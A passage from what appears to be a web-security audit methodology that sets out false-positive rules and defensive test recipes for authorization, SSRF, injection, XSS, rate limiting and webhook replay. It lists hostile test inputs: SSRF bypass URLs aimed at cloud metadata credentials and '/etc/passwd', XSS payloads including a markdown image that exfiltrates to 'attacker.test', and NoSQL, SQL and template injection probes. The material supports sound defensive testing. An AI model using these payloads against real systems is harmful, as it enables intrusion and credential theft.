6. **"Session still valid after logout."** A still-valid access token of fifteen minutes or less, with refresh-token revocation and rotation, is the documented tradeoff of stateless authentication rather than a defect. **What survives:** it is a finding when the token is long-lived, when there is no refresh-revocation path at all, or when logout is offered as the mitigation for a stolen token. Note the ownership split before writing anything about the token itself: whether the signature and claims are verified correctly is `jwt-jws-and-jwks-verification` in `crypto-and-key-management`, and the library-version facts that make most `alg: none` reports wrong belong in that lens's suppression list, not this one.

7. **Missing `integrity` on a first-party, same-origin `<script>`.** Subresource integrity is a control for code loaded from a host you do not control. On a same-origin bundle whose hash changes with every deploy it adds a release-breaking coupling and no security, and requiring it produces a finding the team will correctly ignore — which costs the credibility of the SRI finding on the CDN tag two lines below. **What survives:** the third-party tag with no `integrity` and no `crossorigin`, the versionless CDN URL, and the honest statement that a script whose job is to load further scripts cannot be bounded by SRI at all.

### Rejected candidates

Candidates considered for the list above and deliberately excluded. Nothing here should be quietly re-added; each would have suppressed a real finding, or moved a finding into a section that cannot enforce it.

- **"Missing CSP / `Referrer-Policy` / COOP on a JSON-only API."** Correct and high-frequency, but as a false-positive rule it teaches a reader to dismiss missing CSP on server-rendered routes too, which is where it is real. It is a scope correction instead: item 11 opens by restricting the whole section to responses a browser renders as a document, and the severity table carries the Info grade for the JSON case and for the now-default `Referrer-Policy`.
- **"GraphQL introspection enabled / batching not limited."** The environment-confusion caveat is true and is a calibration fact, not a suppression: it is in the re-graded table, capped at Low where the library closes introspection under a production environment flag. Written as a false positive it would also excuse the cost-bearing findings — unbounded depth, aliased repetition, uncapped batching — which do not depend on introspection at all.
- **"JWT algorithm not pinned / `alg: none` accepted, inferred from a `jwt.decode(...)` call."** Real, well-evidenced, and **not this lens's to suppress**: `jwt-jws-and-jwks-verification` is deferred to `crypto-and-key-management`. A suppression rule here would either duplicate that lens's rule — so a finding could be waved away twice, by two lenses, with neither having read the library version — or be read as clearing the whole JWT class in a lens that cannot verify any of it. The library-version facts belong beside the check they qualify. What this lens keeps is the routing sentence in false positive 6.
- **"The validator checks that the redirect target starts with `/`, so the redirect is safe."** Rejected: `//evil.example` and `/\evil.example` both start with a slash and are protocol-relative. As a suppression rule it would clear the most common exploitable open redirect there is.
- **"The output is passed through DOMPurify, so it is not XSS."** Rejected. It is true often enough to be dangerous: it is false when `ADD_ATTR`/`ADD_TAGS` re-admit event handlers or `svg`/`math`, when `ALLOWED_URI_REGEXP` is relaxed, when the library runs server-side without a DOM implementation and returns its input, and — most often — when the DOM is mutated after sanitizing, which reintroduces mXSS. The discriminators live in item 15 as checklist text so the auditor must look at the configuration and the assignment order rather than at the import.
- **"The framework escapes output by default, so there is no XSS."** Rejected for the same reason, with a wider blast radius. React, Jinja, ERB and Razor all escape the HTML-text context and none of them escape a `javascript:` URL in an `href`, an unquoted attribute, a JSON blob inside a `<script>` block, or an explicit opt-out. A rule phrased at framework level would close all four.
- **"An ORM is in use, so there is no SQL injection."** Rejected outright: every mainstream ORM ships raw-query escape hatches, and item 13 lists them by name precisely because that is where the injections are.
- **"Security headers are set by the CDN or WAF, so their absence in the application is not a finding."** Rejected as unverifiable in the same way, and in the same direction, as any "an equivalent control probably exists elsewhere" rule. It cannot be checked from a repository, and it would clear the case where nothing sets them anywhere. The verifiable half is in Scope, under what cannot be determined: report the application's behavior, name the edge as an assumption, and give the verification step.
- **"The verbose error page only renders when `DEBUG` is true, and that is a development setting."** Rejected: the finding in item 4 is precisely that the *default* is wrong (`os.environ.get("DJANGO_DEBUG", "True")`), so a rule keyed on the flag's intended meaning would clear the shape that ships. Grade the default, not the intent.
- **"The identifier is a UUID, so it cannot be enumerated and the missing ownership check does not matter."** Rejected: unguessability is not authorization, and identifiers leak through shares, `Referer` headers, logs, support tickets and sibling endpoints that return them. It is a severity input — recorded in the finding as reduced enumerability — never a clearance.

## Proof recipes

Shared harness components are referenced by name and not restated here: the **registry-driven enumerator**, the **two-subject fixture**, the **canary fixture set**, the **socket-layer destination recorder** and the **counting fake client**. Their implementations live in `lenses/_harness.md`.

**Tier rule.** T1 is a proof the repository's own test command executes, including one that boots a dependency the repository already boots. T2 requires the auditor to stand up infrastructure the repository does not, and the user is asked every time. **This lens is unusually well served by T1** — almost every recipe below runs under `pytest` or `npm test` against the application's own test client, with no network. Say so in the coverage block, because the contrast with the platform lenses is the reason a web finding can carry a higher tier than a Salesforce one for the same class of defect.

**One hard rail, not a tier:** no recipe here sends a request to a host the repository does not start. No probing of a deployed environment, no scanning, no "just curl the staging URL". Where live evidence is needed, keep it outside this lens and repository-proof workflow and use only the canonical skill's separately authorized external controller.

### R1 — Two-subject authorization sweep (T1)

The primary proof for [item 1](#1-object-level-authorization-bolaidor-authz-object-level), [item 2](#2-tenant-isolation-tenant-isolation-enforcement), [item 3](#3-function-level-authorization-authz-function-level) and [item 6](#6-property-level-authorization-on-the-way-out-authz-property-level).

Build `orgA{user_a, resource_a}` and `orgB{user_b}` once with the **two-subject fixture**, seed `resource_a` with a distinctive marker from the **canary fixture set**, then request A's identifier as B and assert **both** `status in (403, 404)` **and** that the marker appears nowhere in the body, the headers, or any file the request produced. Status alone is not the assertion: a handler that 403s after streaming has still leaked, and a serializer that returns the object under an error envelope still returns it.

Three variants, each of which catches a distinct bug:

- **Client-supplied identity.** Send `{"tenant_id": <A>}` or `{"userId": <victim>}` as B, and assert the request is refused rather than honored.
- **No tenant at all.** Omit the tenant header or claim entirely and assert the response is an error, not every tenant's rows.
- **Every verb, not just `GET`.** Parametrize over the methods the route registry says the route accepts, plus the bulk and export routes for the same resource.

Do not hand-write the case list — see R2.

**Fails on:** `repo.findById(id)`, `Model.objects.get(pk=id)`, a custom action calling the manager directly, an unfiltered aggregate. **Passes on:** an ownership-scoped query, `self.get_object()`, RLS with the tenant set per request.

### R2 — Registry-driven enumeration (T1, the harness that makes R1, R3 and R7 complete)

Never hand-write the endpoint list. Enumerate from the framework's own registry — `app.routes`, `app.url_map.iter_rules()`, `Rails.application.routes.routes`, `app._router.stack`, `RequestMappingHandlerMapping.getHandlerMethods()`, the GraphQL schema's fields, the gRPC service descriptor, the queue-consumer map — and parametrize the hostile case over every member, with a committed allowlist (`PUBLIC_ROUTES`) for the exemptions.

Two details must survive into the implementation:

- **Allowlist entries are anchored patterns, never `startswith`**, with a self-test asserting that `/publications/secret` is not matched by a `/public` entry.
- **Assert the discovered route count against a checked-in number.** An enumerator that silently returns zero rows passes every parametrized test in the suite, which is the failure mode that makes this recipe worth more than the tests it feeds.

**Fails on:** the day someone adds a route with no guard, a new GraphQL field on a sensitive type, or a new version namespace. **Passes on:** a guard present, or a reviewable diff to the allowlist.

### R3 — Canary sweep of every output sink (T1)

The proof for [item 31](#31-application-log-and-url-content-application-log-and-url-content) and for the disclosure half of [item 30](#30-error-handling-verbose-responses-and-fail-open-error-handling-and-verbose-responses).

Populate every sensitive field with an unmistakable canary (`SENTINEL-TOKEN-<uuid>`, `canary+pii@example.test`), attach a *capturing handler to the real logger* — not a mock, so formatters and serializers actually run — and stub the vendor's **transport** rather than its API, so an error tracker's scrubbing behavior is exercised. Exercise the happy path **and** a forced exception inside the handler, then grep every sink for the canary and its derived encodings: base64, base64url, hex, URL-encoded, JSON-escaped, gzip+base64, reversed.

**Ship the regression multiplier:** parametrize over the model's own field list so a newly added sensitive column fails the test until it is registered with the scrubber. That single trick converts a denylist into an enforced allowlist and is the highest-value line in this recipe.

**Fails on:** a request logger that prints the query string, an exception handler that echoes the record, `Authorization` in a log line. **Passes on:** an allowlist-based structured logger, and a route-pattern log field rather than a resolved path.

### R4 — Destination-set assertion at the socket layer (T1)

The proof for [item 19](#19-server-side-request-forgery-ssrf-application-path).

Install the guard **first**, so an unexpected connection fails loudly instead of quietly reaching the internet: `pytest-socket` with `socket_allow_hosts`, a monkeypatched `socket.getaddrinfo` / `create_connection`, or `nock.disableNetConnect()`. Record the destination set and assert it is a subset of the allowlist. Then parametrize the bypass corpus: `http://127.0.0.1:8080/`, `http://[::1]/`, `http://2130706433/`, `http://0177.0.0.1/`, `http://[::ffff:127.0.0.1]/`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, `http://metadata.google.internal/computeMetadata/v1/`, `http://100.100.100.200/`, `http://allowed.example@evil.example/`, `http://evil.example#@allowed.example/`, `http://allowed.example.evil.example/`, `file:///etc/passwd`, `gopher://127.0.0.1:6379/`.

**Two cases separate a real fix from a regex, and both must be kept:**

- **The redirect chase.** The first hop is allowed and returns `302` to `169.254.169.254`; assert it is not followed.
- **DNS rebinding.** Stub the resolver to answer with a public address on the first lookup and `127.0.0.1` on the second. This passes only if the code connects to the address it validated, which is the entire point of the pinned-IP dialer.

**Fails on:** `requests.get(user_url)` behind a hostname regex, and on the "validate then re-resolve" implementation that looks correct. **Passes on:** a pinned-IP dialer or an egress proxy.

### R5 — Injection into a secondary interpreter (T1)

The proof for [item 13](#13-sql-nosql-and-orm-injection-injection-sql-nosql-orm) and [item 14](#14-command-and-template-injection-injection-command-and-template).

Insert two distinguishable records. Call the query path with an exact match and assert the result size is 1. Then call it with a tautology and assert the size is **still 1** — size 2 is the proof, and an assertion that the call merely succeeded proves nothing. Three rows beyond the tautology:

- A `LIKE` case with `%` as the whole input, which escaping does not address.
- A non-quoted position — an `ORDER BY` target or a column name — demonstrating that the fix there is an allowlist.
- A negative control: one input that legitimately returns two rows, so a query that always returns one cannot pass.

For NoSQL, send `{"$ne": null}` and `{"$gt": ""}` as the password field **and, separately, as the username field with a plausible password**, asserting authentication fails both times — the username slot is the one that stays injectable when the handler hashes the password before the query, and testing only the password slot clears that shape wrongly. For command execution, spy on the spawn call and assert the argument vector — not the string — and add a value beginning with `-` to prove argument injection is handled. For templates, submit `{{7*7}}` and its engine-specific siblings and assert the response contains the literal, not `49`.

### R6 — Hostile-output render assertion (T1)

The proof for [item 15](#15-cross-site-scripting-and-output-encoding-xss-and-output-encoding).

Feed every render path a fixed hostile corpus from the **canary fixture set** — `<img src=x onerror="window.__pwned=1">`, `[click](javascript:alert(1))`, `![x](https://attacker.test/p?d=SECRET)`, an `<iframe>`, a data-URI SVG, and a `</script>` breakout inside a JSON value — and assert: no `img` or `iframe` element exists in the rendered subtree, the payload appears as text rather than markup, `window.__pwned` is undefined, and no attacker-controlled host survives in any `src` or `href`. Run it under jsdom or the framework's own test renderer, and enumerate the components with the **registry-driven enumerator** so a newly added manual-DOM write fails until someone looks at it.

Add the route-level assertion the corpus cannot make on its own: that the response's CSP names `script-src` explicitly rather than leaning on `default-src`, and that it contains neither `'unsafe-inline'` nor `'unsafe-eval'`.

**Fails on:** an `innerHTML` write of untrusted text, an unvalidated `href`, an interpolated JSON blob in an inline script. **Passes on:** text binding, a scheme allowlist, and `JSON.parse` from a typed script block.

### R7 — Counting-spy caps on resources and cost (T1)

The proof for [item 22](#22-rate-limiting-and-request-quotas-rate-limiting-and-request-quotas) and [item 23](#23-graphql-api-surface-graphql-api-surface).

Generate the payload programmatically so the test documents the threshold: `'query{user{' + 'friends{'.repeat(30) + 'id' + '}'.repeat(30) + '}}'`, the same expensive field aliased five hundred times, a batch of one hundred operations, `?limit=1000000`. Assert a validation error **and that the resolver spies recorded zero calls** — a server that executes and then truncates is still vulnerable, and only the spy distinguishes the two.

For rate limits: loop `MAX + 1` and assert `429` with `Retry-After`, then loop again varying `X-Forwarded-For` on every request and assert it *still* returns `429`. Reset the limiter store in a fixture so the suite stays order-independent, and where the store is in-process, assert that fact explicitly — it is the finding.

### R8 — Fail-open injection at a dependency boundary (T1)

The proof for [item 30](#30-error-handling-verbose-responses-and-fail-open-error-handling-and-verbose-responses), and the cheapest high-yield recipe in this lens.

Monkeypatch the dependency the boundary consults — policy service, token introspection, JWKS fetch, secret manager, webhook-secret lookup, feature-flag provider — to raise a timeout, then send a request that must be denied. Assert denial (403) or hard failure (5xx) **and** that the protected side effect did not occur. Repeat with malformed-but-successful output: an empty body, `{}`, `null`, and HTTP 200 carrying an HTML error page. "Deny on error" is usually implemented for exceptions only, and the second half of this recipe is what finds that out.

Add the missing-input variant while you are there: send the request with the signature or token header **absent** rather than wrong, which is the case the `if (sig && !verify(sig))` shape lets through.

### R9 — Signed-request replay and timestamp boundary (T1)

The proof for [item 26](#26-webhook-handler-integrity-webhook-handler-integrity).

Capture one genuinely valid signed request from the happy path, then six rows, each asserting **status and side effect**: (1) valid → 200 and exactly one row or mock call; (2) a body differing only in whitespace or key order, with the original signature → rejected, which proves raw-bytes verification rather than re-serialization; (3) one byte flipped → rejected and the side-effect spy never called; (4) `timestamp = now - window - 1s` rejected and `now - window + 1s` accepted, which pins the boundary instead of guessing it; (5) the timestamp header deleted → rejected, and `now + 24h` → rejected; (6) the same delivery sent twice → the second is a no-op, one row and not two.

The constant-time property of the comparison itself is crypto's assertion, not this one — spy on it if it is convenient, but do not report a finding against it here.

### Not provable here, and reported as such every run

Name these in the coverage block rather than letting silence imply safety.

- **Whether a control terminated at the edge exists.** WAF rules, CDN header injection, gateway authorizers and IdP lockout policies. Every rate-limiting and header finding in this lens carries this caveat, and it is the single largest source of disagreement with a client's own understanding of their stack.
- **The deployed value of an environment-driven flag.** `NODE_ENV`, `DEBUG`, GraphQL `introspection`, `APP_DEBUG`, `ASPNETCORE_ENVIRONMENT`. The repository shows the default and the plumbing; the container shows the truth.
- **Request smuggling and desync.** Proving a CL.TE or TE.CL desync requires the deployed proxy-origin pair. What this lens proves instead is the repository-visible half: trusted forwarded headers and path-normalization disagreement.
- **Whether an identifier is enumerable in production.** The column type is visible; the distribution of live values is not.
- **Real browser behavior.** Whether a CSP is actually delivered on a given route, whether a cookie is accepted with the attributes the code set, and whether a third-party script is loaded before consent, all need a browser against a running application. The header-construction assertions are T1; the delivered-response assertions are not.
- **Whether an over-returned or logged field is regulated data.** That is `phi-classification` in `hipaa-and-phi` and the personal-data determination in `privacy-and-data-protection`. This lens proves the field left the boundary; those lenses say what it costs.
